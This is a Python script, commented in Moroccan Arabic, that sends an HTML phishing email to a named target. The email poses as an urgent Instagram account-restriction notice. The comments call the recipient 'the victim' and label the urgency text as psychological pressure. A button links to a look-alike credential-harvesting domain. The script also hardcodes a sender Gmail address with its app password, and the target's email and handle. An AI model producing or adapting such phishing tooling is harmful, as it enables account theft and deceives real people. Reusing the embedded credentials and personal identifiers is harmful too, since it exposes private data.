import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

# ==========================================
# 1. إعدادات الإرسال
# ==========================================
MY_EMAIL = "instagrammheelpp@gmail.com"        # الإيميل ديالك
MY_PASSWORD = "mxxs auxz mciy ejch"         # الباسورد ديال التطبيقات
TARGET_EMAIL = "elkaddourihind73@gmail.com"        # الإيميل ديال الهدف

# ==========================================
# 2. النص الاحترافي المكتوب بعناية
# ==========================================
TARGET_NAME = "hindelkad11"                  # <--- هنا كتب سمية الضحية أو حسابو
SENDER_NAME = "فريق الأمان والدعم"           
EMAIL_SUBJECT = "إشعار أمني عاجل: تقييد مؤقت لحسابك"    
COMPANY_NAME = "مركز الحماية والخصوصية"          

# الفقرة الأولى: المشكل
PARAGRAPH_1 = "اكتشفنا نشاطًا غير عادي على حسابك في Instagram، ولهذا قمنا مؤقتًا بتقييد بعض الميزات لحمايتك.. لحماية بياناتك وخصوصيتك، قمنا بتقييد الوصول إلى بعض ميزات الحساب بشكل مؤقت كإجراء احترازي."

# الفقرة الثانية: الحل والضغط النفسي (الاستعجال)
PARAGRAPH_2 = "يرجى العلم أنه بموجب سياسات الاستخدام الآمن، إذا لم يتم التحقق من هويتك وتحديث بياناتك خلال 48 ساعة، فقد نضطر إلى تعليق الحساب نهائيًا. نرجو منك اتخاذ الإجراء اللازم فوراً لضمان استمرار الخدمة."
 
# البوطونا الزرقا 
BUTTON_TEXT = "تأمين الحساب واستعادة الوصول"         
BUTTON_LINK = "https://acccount.pythonanywhere.com/" # حط الرابط ديالك هنا

# ==========================================
# 3. التصميم (ألوان متناسقة، زر أزرق احترافي)
# ==========================================
html = f"""
<html dir="rtl">
<head>
    <meta charset="UTF-8">
</head>
<body style="background-color: #121212; color: #ffffff; font-family: 'Segoe UI', Tahoma, Arial, sans-serif; padding: 0; margin: 0;">
    
    <div style="max-width: 600px; margin: 0 auto; background-color: #1a1a1a; padding: 40px 30px; border-radius: 8px; border: 1px solid #333;">
        
        <!-- اللوغو (اسم الشركة) -->
        <div style="margin-bottom: 30px; border-bottom: 1px solid #333; padding-bottom: 15px;">
            <h1 style="color: #ffffff; font-size: 26px; margin: 0; font-weight: bold; letter-spacing: 1px;">{COMPANY_NAME}</h1>
        </div>

        <!-- المحتوى -->
        <h2 style="font-size: 22px; font-weight: bold; margin-bottom: 20px; color: #e74c3c;">تنبيه أمني،</h2>
        
        <!-- الترحيب بالاسم -->
        <p style="font-size: 18px; font-weight: bold; margin-bottom: 20px; color: #ffffff;">
            مرحبًا: {TARGET_NAME}
        </p>
        
        <p style="font-size: 16px; line-height: 1.8; margin-bottom: 15px; color: #dcdcdc;">
            {PARAGRAPH_1}
        </p>
        
        <p style="font-size: 16px; line-height: 1.8; margin-bottom: 30px; color: #dcdcdc;">
            {PARAGRAPH_2}
        </p>
        
        <!-- الزر الأزرق -->
        <div style="margin-top: 35px; margin-bottom: 40px; text-align: center;">
            <a href="{BUTTON_LINK}" style="background-color: #2980b9; color: #ffffff; text-decoration: none; padding: 15px 35px; border-radius: 5px; font-size: 17px; font-weight: bold; display: inline-block; box-shadow: 0 4px 6px rgba(0,0,0,0.3);">
                {BUTTON_TEXT}
            </a>
        </div>
        
        <p style="font-size: 14px; color: #95a5a6; margin-bottom: 30px; line-height: 1.6;">
            * إذا لم تكن أنت من قام بمحاولة الدخول الأخيرة، فإن حسابك معرض لخطر الاختراق. يرجى تأمين الحساب فوراً.
        </p>
        
        <p style="font-size: 16px; margin-bottom: 0; color: #ecf0f1;">
            مع خالص التحيات،<br>
            <strong>{SENDER_NAME}</strong>
        </p>

        <!-- الفوتر -->
        <hr style="border: 0; border-top: 1px solid #333; margin: 40px 0 20px 0;">
        <div style="text-align: center; color: #7f8c8d; font-size: 12px; line-height: 1.6;">
            هذه رسالة تلقائية من نظام الحماية، يرجى عدم الرد على هذا البريد الإلكتروني.
            <br><br>
            © 2026 {COMPANY_NAME}. جميع الحقوق محفوظة.
        </div>
    </div>
</body>
</html>
"""

# تجهيز الإيميل
msg = MIMEMultipart("alternative")
msg['Subject'] = EMAIL_SUBJECT
msg['From'] = f"{SENDER_NAME} <{MY_EMAIL}>"
msg['To'] = TARGET_EMAIL

part = MIMEText(html, 'html', 'utf-8')
msg.attach(part)

# عملية الإرسال
try:
    print("جاري الاتصال بسيرفور Google...")
    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
    server.login(MY_EMAIL, MY_PASSWORD)
    server.sendmail(MY_EMAIL, TARGET_EMAIL, msg.as_string())
    server.quit()
    print("✅ تم إرسال الإيميل الاحترافي بنجاح! 🚀")
except Exception as e:
    print("❌ كاين شي مشكل:", e)